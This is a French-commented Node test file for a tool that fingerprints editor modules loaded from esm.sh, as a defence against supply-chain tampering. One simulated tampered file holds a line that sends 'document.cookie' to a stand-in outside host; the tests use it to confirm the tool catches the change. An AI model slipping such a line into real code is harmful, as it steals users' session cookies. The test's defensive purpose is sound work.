#!/usr/bin/env node
// Tests purs (Node, sans navigateur ni réseau) de l'outil qui relève et vérifie les empreintes du code de l'éditeur chargé depuis esm.sh : outils/empreintes-editeur.mjs (point sécurité du 06/11,
// risque « chaîne d'approvisionnement » : le code de TipTap et de ProseMirror s'exécute avec l'accès complet au document sans qu'aucune empreinte ne le contrôle). Un faux esm.sh en mémoire sert un petit
// graphe de modules ; ce que l'outil doit attraper :
//  1) une adresse à VERSION FLOTTANTE (`@^2.0.0`, `@~1.2`, `@latest`) : esm.sh la résout à chaque demande, donc une version publiée (ou volée) sur npm se chargerait le jour même. Une adresse à version exacte
//     (dont celles de paquets à portée `@tiptap/core@3.31.3`, d'un build externe `*prosemirror-model@1.25.11` et d'une préversion) n'en est pas une ;
//  2) le parcours lit les imports comme le navigateur : minifiés (`import"/x.mjs"`, `export*from"/y.mjs"`, `import("/z.mjs")`), chemins absolus, relatifs et spécificateurs nus, et la carte d'importation
//     qui REMPLACE une adresse (c'est ainsi qu'une adresse flottante est figée : une entrée de la carte qui la renvoie vers la version exacte) ;
//  3) les sources d'esm.sh de la politique de sécurité du contenu (choix du 11/11, « Resserrer la liste ») : un dossier par paquet à version exacte (et son adresse nue quand elle est chargée aussi), les cales
//     node/ une à une, JAMAIS l'hôte entier ; écrites d'un bloc dans la liste de l'app (package.json, gfs.politique.scriptSrc : consignes 063 et 067 de GFS), sans toucher aux autres sources ni au reste du fichier,
//     le même texte à chaque relance ; la page, elle, est écrite par l'outil du kit seul (un seul écrivain : la ligne de commande ne touche pas index.html) ;
//  4) la vérification : rien n'a bougé = rien à dire ; un fichier figé chez esm.sh qui change d'un octet, un fichier nouveau, un fichier disparu, une adresse flottante qui revient, ou des navigateurs qui
//     reçoivent des octets différents (un serveur qui change de réponse selon le navigateur) = écart ; un fichier non figé (une cale `node/*.mjs`, un jour de cache) qui change = « à regarder » seulement.
// Lancer : node dev-tests/unit-editor-fingerprints.mjs
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { check, summarizeAndExit } from './unit-harness.mjs';
import { floatingVersion, resolveSpecifier, specifiersOf, esmImports, importMapDigest, crawl, consolidate, buildManifest, compare, scriptSources, withListSources } from '../outils/empreintes-editeur.mjs';

// ---- 1. Versions flottantes et versions exactes
const exact = [
  'https://esm.sh/@tiptap/core@3.31.3', 'https://esm.sh/@tiptap/core@3.31.3/es2022/core.mjs', 'https://esm.sh/*prosemirror-model@1.25.11', 'https://esm.sh/*prosemirror-model@1.25.11/es2022/prosemirror-model.mjs',
  'https://esm.sh/@floating-ui/utils@0.2.12/dom?target=es2022', 'https://esm.sh/linkifyjs@4.4.0?target=es2022', 'https://esm.sh/pkg@1.0.0-beta.2/es2022/pkg.mjs', 'https://esm.sh/node/process.mjs',
];
const floating = [
  ['https://esm.sh/@floating-ui/dom@^1.0.0?target=es2022', '@%5E1.0.0'], ['https://esm.sh/linkifyjs@^4.3.3?target=es2022', '@%5E4.3.3'], ['https://esm.sh/@floating-ui/utils@^0.2.8/dom?target=es2022', '@%5E0.2.8'],
  ['https://esm.sh/pkg@~1.2.0', '@~1.2.0'], ['https://esm.sh/pkg@latest', '@latest'], ['https://esm.sh/pkg@1', '@1'], ['https://esm.sh/pkg@1.x/es2022/pkg.mjs', '@1.x'], ['https://esm.sh/@scope/pkg@*', '@*'],
];
check('versions : une version exacte n\'est jamais prise pour flottante (paquet à portée, build externe « * », préversion, cale sans version)', exact.every(address => floatingVersion(address) === null), exact.filter(address => floatingVersion(address) !== null).join(' '));
check('versions : `@^1.0.0`, `@~1.2.0`, `@1`, `@1.x`, `@latest` et `@*` sont tous vus comme flottants, même derrière un paquet à portée ou avant un sous-chemin', floating.every(([address]) => floatingVersion(address) !== null), floating.filter(([address]) => floatingVersion(address) === null).map(([address]) => address).join(' '));

// ---- 2. La lecture des imports et la résolution des adresses
const minified = 'import"/a.mjs";import{x as y}from"/b.mjs";export*from"/c.mjs";export{z}from"./d.mjs";const l=()=>import("/e.mjs");import w,{v}from "pkg-nu";export*as ns from"/f.mjs";/* from"/pas-un-import.mjs" ignoré s\'il n\'est pas précédé d\'import ou d\'export */';
const specs = specifiersOf(minified);
check('lecture : les imports minifiés (import"…", from"…", export*from"…", export{…}from"…", import(…), export*as) sont tous trouvés, rien de plus', JSON.stringify(specs) === JSON.stringify(['/a.mjs', '/b.mjs', '/c.mjs', './d.mjs', '/e.mjs', 'pkg-nu', '/f.mjs']), JSON.stringify(specs));
const imports = { 'pkg-nu': 'https://esm.sh/pkg-nu@1.0.0', 'https://esm.sh/dep@^2.0.0?target=es2022': 'https://esm.sh/dep@2.3.0?target=es2022' };
const from = 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs';
check('résolution : chemin absolu, relatif, spécificateur nu (carte) et adresse complète donnent l\'adresse absolue', resolveSpecifier('/x/y.mjs', from, imports) === 'https://esm.sh/x/y.mjs' && resolveSpecifier('./z.mjs', from, imports) === 'https://esm.sh/pkg@1.0.0/es2022/z.mjs' && resolveSpecifier('pkg-nu', from, imports) === 'https://esm.sh/pkg-nu@1.0.0' && resolveSpecifier('https://esm.sh/q.mjs', from, imports) === 'https://esm.sh/q.mjs');
check('résolution : la carte d\'importation REMPLACE une adresse flottante par la version exacte (c\'est ce qui la fige), comme le fait le navigateur', resolveSpecifier('/dep@^2.0.0?target=es2022', from, imports) === 'https://esm.sh/dep@2.3.0?target=es2022');
check('résolution : un spécificateur nu que la carte ne connaît pas n\'est pas résolu (le navigateur refuserait de le charger)', resolveSpecifier('inconnu', from, imports) === null);

// ---- 3. Un faux esm.sh : un paquet qui importe une dépendance à version flottante et une cale non figée
const stub = path => `/* esm.sh */\nexport * from "${path}";\n`;
function server(over = {}) {
  const files = {
    'https://esm.sh/pkg@1.0.0': stub('/pkg@1.0.0/es2022/pkg.mjs'),
    'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs': 'import{a}from"/dep@^2.0.0?target=es2022";import"/node/shim.mjs";export const b=a;',
    'https://esm.sh/dep@^2.0.0?target=es2022': stub('/dep@2.3.0/es2022/dep.mjs'),
    'https://esm.sh/dep@2.3.0?target=es2022': stub('/dep@2.3.0/es2022/dep.mjs'),
    'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'export const a=1;',
    'https://esm.sh/node/shim.mjs': 'export default {};',
    ...over,
  };
  const calls = [];
  const fetchFn = async (address, userAgent) => {
    calls.push([address, userAgent]);
    const text = typeof files[address] === 'function' ? files[address](userAgent) : files[address];
    if (text === undefined) return { status: 404, bytes: Buffer.from('introuvable'), cacheControl: 'public, max-age=600' };
    // esm.sh : un cache immuable d'un an pour les fichiers à version exacte, dix minutes pour une adresse flottante, un jour pour ses cales.
    const cacheControl = /\/node\//.test(address) ? 'public, max-age=86400' : floatingVersion(address) ? 'public, max-age=600' : 'public, max-age=31536000, immutable';
    return { status: 200, bytes: Buffer.from(text), cacheControl };
  };
  return { fetchFn, calls };
}
const BROWSERS = { chrome: 'UA-chrome', firefox: 'UA-firefox', safari: 'UA-safari' };
const pinned = { pkg: 'https://esm.sh/pkg@1.0.0', 'https://esm.sh/dep@^2.0.0?target=es2022': 'https://esm.sh/dep@2.3.0?target=es2022' };
const unpinned = { pkg: 'https://esm.sh/pkg@1.0.0' };
async function walk(map, over) {
  const s = server(over);
  const result = await crawl({ imports: map, fetchFn: s.fetchFn, browsers: BROWSERS });
  const consolidated = consolidate(result);
  return { ...s, result, consolidated, addresses: Object.keys(consolidated.files).sort() };
}

const withMap = await walk(pinned);
check('parcours : de proche en proche, tout ce que la carte fait charger, cales comprises, et la dépendance flottante n\'y est PLUS (la carte l\'a remplacée par sa version exacte)',
  JSON.stringify(withMap.addresses) === JSON.stringify(['https://esm.sh/dep@2.3.0/es2022/dep.mjs', 'https://esm.sh/dep@2.3.0?target=es2022', 'https://esm.sh/node/shim.mjs', 'https://esm.sh/pkg@1.0.0', 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs']), JSON.stringify(withMap.addresses));
check('parcours : chacun des cinq fichiers est demandé avec chacun des trois navigateurs, et le parcours n\'a laissé aucun spécificateur de côté', withMap.calls.length === 5 * 3 && withMap.result.problems.length === 0, `${withMap.calls.length} demandes, ${withMap.result.problems.length} problème(s)`);
check('parcours : les fichiers à version exacte sont notés « figés » (cache immuable), la cale de node/ ne l\'est pas', withMap.consolidated.files['https://esm.sh/pkg@1.0.0/es2022/pkg.mjs'].frozen === true && withMap.consolidated.files['https://esm.sh/node/shim.mjs'].frozen === false);
const without = await walk(unpinned);
check('parcours SANS l\'entrée de la carte : la dépendance flottante est dans le parcours (c\'est ce que la vérification refuse)', without.addresses.some(floatingVersion), without.addresses.join(' '));

// ---- 4. Le relevé et sa vérification
const manifest = buildManifest({ imports: pinned, consolidated: withMap.consolidated, browsers: Object.keys(BROWSERS) });
const same = compare(manifest, (await walk(pinned)).consolidated);
check('vérification : rien n\'a bougé, rien à dire', same.hard.length === 0 && same.soft.length === 0, JSON.stringify(same));
const changedFrozen = compare(manifest, (await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'export const a=1;fetch("https://autre.exemple/?"+document.cookie);' })).consolidated);
check('vérification : un fichier figé chez esm.sh qui change d\'un octet est un écart, nommé', changedFrozen.hard.length === 1 && /fichier figé modifié : https:\/\/esm\.sh\/dep@2\.3\.0\/es2022\/dep\.mjs/.test(changedFrozen.hard[0]), JSON.stringify(changedFrozen));
const changedShim = compare(manifest, (await walk(pinned, { 'https://esm.sh/node/shim.mjs': 'export default {version:2};' })).consolidated);
check('vérification : une cale non figée qui change est « à regarder » seulement, pas un écart', changedShim.hard.length === 0 && changedShim.soft.length === 1 && /non figé/.test(changedShim.soft[0]), JSON.stringify(changedShim));
const newImport = compare(manifest, (await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'import"/charge-utile@1.0.0/es2022/c.mjs";export const a=1;', 'https://esm.sh/charge-utile@1.0.0/es2022/c.mjs': 'export {};' })).consolidated);
check('vérification : un fichier nouveau (un import ajouté chez esm.sh) est un écart', newImport.hard.some(line => /nouveau fichier chargé, absent du relevé : https:\/\/esm\.sh\/charge-utile@1\.0\.0\/es2022\/c\.mjs/.test(line)), JSON.stringify(newImport));
const vanished = compare(manifest, (await walk(pinned, { 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs': 'export const b=1;' })).consolidated);
check('vérification : un fichier du relevé qui n\'est plus chargé est un écart', vanished.hard.some(line => /n'est plus chargé : https:\/\/esm\.sh\/node\/shim\.mjs/.test(line)), JSON.stringify(vanished));
const floatingBack = compare(manifest, without.consolidated);
check('vérification : une adresse à version flottante dans le parcours est un écart, même si elle servait déjà au relevé', floatingBack.hard.some(line => /version flottante @%5E2\.0\.0/.test(line) || /version flottante @\^2\.0\.0/.test(line)), JSON.stringify(floatingBack));
const cloaked = await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': userAgent => (userAgent === 'UA-firefox' ? 'export const a=1;/* servi à Firefox seulement */' : 'export const a=1;') });
const cloakedCompare = compare(manifest, cloaked.consolidated, cloaked.consolidated.divergences);
check('vérification : un serveur qui sert des octets différents selon le navigateur est un écart (signe d\'une compromission), même si le premier navigateur reçoit le bon fichier', cloaked.consolidated.divergences.length === 1 && cloakedCompare.hard.some(line => /les navigateurs divergent/.test(line)), JSON.stringify(cloakedCompare));

// ---- 5. La carte d'importation de la page
const html = `<script type="importmap">{"imports":{"kit/x":"./kit/js/x.js?v=1","@a/b":"https://esm.sh/@a/b@1.0.0","https://esm.sh/c@^1.0.0?target=es2022":"https://esm.sh/c@1.2.3?target=es2022"}}</script>`;
const mine = esmImports(html);
check('carte : seules les entrées qui touchent esm.sh sont retenues (le kit de GFS change avec son propre sous-module), triées', JSON.stringify(Object.keys(mine)) === JSON.stringify(['@a/b', 'https://esm.sh/c@^1.0.0?target=es2022']), JSON.stringify(Object.keys(mine)));
check('carte : son empreinte change dès qu\'une entrée change (le relevé est alors à refaire), pas quand le kit change', importMapDigest(mine) === importMapDigest(esmImports(html.replace('x.js?v=1', 'x.js?v=2'))) && importMapDigest(mine) !== importMapDigest(esmImports(html.replace('c@1.2.3', 'c@1.2.4'))));

// ---- 6. Les sources d'esm.sh de la politique de sécurité du contenu
const addresses = [
  'https://esm.sh/@tiptap/core@3.31.3', 'https://esm.sh/@tiptap/core@3.31.3/es2022/core.mjs', 'https://esm.sh/@tiptap/core@3.31.3/es2022/dist/jsx-runtime/jsx-runtime.mjs',
  'https://esm.sh/*prosemirror-model@1.25.11', 'https://esm.sh/*prosemirror-model@1.25.11/es2022/prosemirror-model.mjs', 'https://esm.sh/@floating-ui/utils@0.2.12/dom?target=es2022',
  'https://esm.sh/linkifyjs@4.4.0?target=es2022', 'https://esm.sh/node/process.mjs', 'https://autre.exemple/x.mjs',
];
const sources = scriptSources(addresses);
const expectedSources = [
  'https://esm.sh/*prosemirror-model@1.25.11', 'https://esm.sh/*prosemirror-model@1.25.11/', 'https://esm.sh/@floating-ui/utils@0.2.12/', 'https://esm.sh/@tiptap/core@3.31.3', 'https://esm.sh/@tiptap/core@3.31.3/',
  'https://esm.sh/linkifyjs@4.4.0', 'https://esm.sh/node/process.mjs',
];
check('politique : un dossier par paquet à version exacte (portée, build externe « * » compris), son adresse nue quand elle est chargée aussi, la cale node/ telle quelle, rien d\'un autre site, la requête ?target ignorée', JSON.stringify(sources) === JSON.stringify(expectedSources), JSON.stringify(sources));
check('politique : jamais l\'hôte entier ni la racine, et un paquet sans version exacte ne donne pas de dossier ouvert à toutes ses versions', !sources.includes('https://esm.sh') && !sources.includes('https://esm.sh/') && sources.every(source => /@\d+\.\d+\.\d+\/?$|\/node\/[a-z_]+\.mjs$/.test(source)), JSON.stringify(sources));
// La liste de l'app (package.json, consignes 063 et 067 de GFS) : l'outil du kit écrit le `script-src` d'index.html d'après `gfs.politique.scriptSrc` ; le relevé y tient les sources d'esm.sh à jour.
const list = JSON.stringify({
  name: 'essai', private: true, dependencies: { a: '1.0.0' },
  gfs: { page: 'index.html', politique: { scriptSrc: ["'self'", "'unsafe-eval'", 'https://esm.sh/ancien@1.0.0', 'https://esm.sh/ancien@1.0.0/', 'https://docs.getgrist.com/grist-plugin-api.js', 'https://autre.exemple/a[1].js'] }, carte: { origine: 'https://esm.sh', paquets: ['a'] } },
  devDependencies: { esbuild: '0.25.10' },
}, null, 2) + '\n';
const written = withListSources(list, sources);
const tokens = JSON.parse(written).gfs.politique.scriptSrc;
check('réécriture : les sources du relevé entrent à la place des adresses d\'esm.sh de la liste, tout le reste (autres sites, hôte entier exclu) est gardé dans le même ordre',
  !tokens.includes('https://esm.sh/ancien@1.0.0') && expectedSources.every(source => tokens.includes(source)) && JSON.stringify(tokens.filter(token => !token.startsWith('https://esm.sh'))) === JSON.stringify(["'self'", "'unsafe-eval'", 'https://docs.getgrist.com/grist-plugin-api.js', 'https://autre.exemple/a[1].js'])
    && tokens.indexOf(expectedSources[0]) === 2 && tokens[tokens.length - 1] === 'https://autre.exemple/a[1].js', JSON.stringify(tokens));
const before = list.slice(0, list.indexOf('"scriptSrc"'));
const arrayEnd = list.indexOf('\n      ]') + '\n      ]'.length, writtenArrayEnd = written.indexOf('\n      ]') + '\n      ]'.length;
check('réécriture : seul le tableau change : le texte avant et après lui est repris octet pour octet (les autres sections, dependencies, devDependencies, gfs.carte)', written.startsWith(before) && written.slice(writtenArrayEnd) === list.slice(arrayEnd), written.slice(writtenArrayEnd, writtenArrayEnd + 40));
check('réécriture : une source par ligne, à l\'indentation du tableau de la liste (le fichier est le même qu\'un JSON.stringify de deux espaces)', written.split('\n').filter(line => line.includes('https://esm.sh/')).every(line => /^ {8}"https:\/\/esm\.sh\/[^"]+",?$/.test(line)) && JSON.stringify(JSON.parse(written), null, 2) + '\n' === written);
check('réécriture : relancée, elle donne le même texte ; une liste plus courte retire les sources qui ne sont plus au relevé', withListSources(written, sources) === written && !withListSources(written, expectedSources.slice(0, 2)).includes('linkifyjs'));
const compact = '{"gfs":{"politique":{"scriptSrc":["\'self\'","https://esm.sh/ancien@1.0.0","https://docs.getgrist.com/grist-plugin-api.js","https://esm.sh/autre@2.0.0"]}},"dependencies":{}}';
const compactWritten = withListSources(compact, expectedSources.slice(0, 3));
check('réécriture : une liste écrite autrement (tout sur une ligne, adresses d\'esm.sh séparées) est réécrite de même : les sources entrent à la place de la première, la seconde adresse d\'esm.sh part, le reste ne bouge pas',
  JSON.stringify(JSON.parse(compactWritten).gfs.politique.scriptSrc) === JSON.stringify(["'self'", ...expectedSources.slice(0, 3), 'https://docs.getgrist.com/grist-plugin-api.js']) && compactWritten.endsWith(']}},"dependencies":{}}'), compactWritten);
const refuses = (text) => { try { withListSources(text, sources); return ''; } catch (error) { return error.message; } };
const withoutEsm = list.replace(/^ +"https:\/\/esm\.sh[^\n]*\n/gm, '');
check('réécriture : une liste sans aucune adresse d\'esm.sh dans scriptSrc est une erreur, pas une écriture muette', JSON.parse(withoutEsm).gfs.politique.scriptSrc.length === 4 && /aucune adresse d'esm\.sh/.test(refuses(withoutEsm)), refuses(withoutEsm));
check('réécriture : une liste sans gfs.politique.scriptSrc est une erreur nommée (le relevé n\'invente pas où poser les sources)', /introuvable/.test(refuses('{"dependencies":{}}')) && /introuvable/.test(refuses('{"gfs":{"politique":{}}}')), refuses('{"dependencies":{}}'));

// ---- 7. La ligne de commande n'écrit que la liste : la page est à l'outil du kit (un seul écrivain)
{
  const dir = mkdtempSync(join(tmpdir(), 'releve-liste-'));
  try {
    mkdirSync(join(dir, 'outils'));
    for (const file of ['empreintes-editeur.mjs', 'empreintes-editeur.json']) copyFileSync(join(dirname(fileURLToPath(import.meta.url)), '..', 'outils', file), join(dir, 'outils', file));
    const known = JSON.parse(readFileSync(join(dir, 'outils', 'empreintes-editeur.json'), 'utf8')).fichiers;
    const realSources = scriptSources(Object.keys(known).filter(address => !known[address].statut));
    const page = '<!DOCTYPE html>\n<meta http-equiv="Content-Security-Policy" content="script-src \'self\' https://esm.sh/ancien@1.0.0 \'sha256-AAAA=\'; object-src \'none\'">\n<script type="importmap">{"imports":{}}</script>\n';
    const start = JSON.stringify({ gfs: { page: 'index.html', politique: { scriptSrc: ["'self'", 'https://esm.sh/ancien@1.0.0', 'https://docs.getgrist.com/grist-plugin-api.js'] } } }, null, 2) + '\n';
    writeFileSync(join(dir, 'index.html'), page);
    writeFileSync(join(dir, 'package.json'), start);
    const run = () => spawnSync(process.execPath, [join(dir, 'outils', 'empreintes-editeur.mjs'), '--poser-politique'], { encoding: 'utf8' });
    const first = run();
    const afterFirst = readFileSync(join(dir, 'package.json'), 'utf8');
    const second = run();
    const rewritten = JSON.parse(afterFirst).gfs.politique.scriptSrc;
    check('ligne de commande : --poser-politique écrit les sources du relevé dans la liste (package.json), sans réseau, et dit de relancer l\'outil du kit', first.status === 0 && JSON.stringify(rewritten) === JSON.stringify(["'self'", ...realSources, 'https://docs.getgrist.com/grist-plugin-api.js']) && /kit\/outils\/bibliotheques\.mjs/.test(first.stdout), `${first.status} ${first.stdout} ${first.stderr}`.slice(0, 300));
    check('ligne de commande : index.html n\'est PAS touché (octet pour octet) : la carte d\'importation et le script-src sont écrits par l\'outil du kit seul', readFileSync(join(dir, 'index.html'), 'utf8') === page);
    check('ligne de commande : relancée, elle dit que la liste est déjà celle du relevé et ne change pas un octet', second.status === 0 && /déjà celles du relevé/.test(second.stdout) && readFileSync(join(dir, 'package.json'), 'utf8') === afterFirst, second.stdout);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

summarizeAndExit();
